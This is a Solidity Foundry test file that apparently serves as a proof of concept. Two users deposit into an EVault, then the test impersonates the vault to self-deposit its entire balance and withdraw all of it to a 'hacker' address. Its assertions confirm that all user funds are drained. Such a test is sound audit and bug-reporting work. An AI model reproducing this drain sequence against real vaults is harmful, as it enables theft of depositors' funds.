// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {EVaultTestBase} from "../unit/evault/EVaultTestBase.t.sol";
import {console2} from "forge-std/Test.sol";

contract VaultTest_DepositSelf2 is EVaultTestBase {
    uint256 one = 1e18;
    uint256 two = 2 * one;
    address user = makeAddr("user");
    address user2 = makeAddr("user2");
    address hacker = makeAddr("hacker");

    function _log(string memory label) public view {
        console2.log(label, "| User   Balance :", assetTST.balanceOf(user));
        console2.log(label, "| User2  Balance :", assetTST.balanceOf(user2));
        console2.log(label, "| Vault  Balance :", assetTST.balanceOf(address(eTST)));
        console2.log(label, "| Total  Assets  :", eTST.totalAssets());
        console2.log(label, "| Hacker Balance :", assetTST.balanceOf(hacker));
        console2.log("------------------------|-------------------------------------");
    }

    function test_depositSelf2Hoax() public {
        assetTST.mint(user, one);
        _log("       User   Mint    1");

        assetTST.mint(user2, two);
        _log("       User2  Mint    2");

        assert(assetTST.balanceOf(address(eTST)) == 0);
        assert(assetTST.balanceOf(user) == one);
        assert(assetTST.balanceOf(user2) == two);
        assert(assetTST.balanceOf(hacker) == 0);

        startHoax(user);
        assetTST.approve(address(eTST), one);
        eTST.deposit(one, user);
        _log("       User   Deposit 1");

        startHoax(user2);
        assetTST.approve(address(eTST), two);
        eTST.deposit(two, user2);
        _log("       User2  Deposit 2");

        startHoax(address(eTST));
        eTST.deposit(one + two, address(eTST));
        _log("Buggy  Vault  Deposit 3");

        eTST.withdraw(one + two, hacker, address(eTST));
        _log("Hacker Vault  Steal   3");

        assert(assetTST.balanceOf(address(eTST)) == 0);
        assert(assetTST.balanceOf(user) == 0);
        assert(assetTST.balanceOf(user2) == 0);
        assert(assetTST.balanceOf(hacker) == one + two);
    }
}
